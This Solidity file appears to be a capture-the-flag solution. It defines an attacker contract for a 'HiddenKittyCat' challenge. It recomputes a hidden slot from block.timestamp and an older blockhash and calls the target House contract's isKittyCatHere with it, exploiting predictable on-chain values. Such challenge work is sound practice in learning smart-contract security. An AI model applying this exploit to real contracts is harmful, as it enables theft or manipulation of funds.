// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Challenges/HiddenKittyCat.sol";

contract HiddenKittyCatAttacker {
    function attack(address _houseAddress) public {
        bytes32 _slot = keccak256(
            abi.encodePacked(block.timestamp, blockhash(block.number - 69))
        );
        House(_houseAddress).isKittyCatHere(_slot);
    }
}
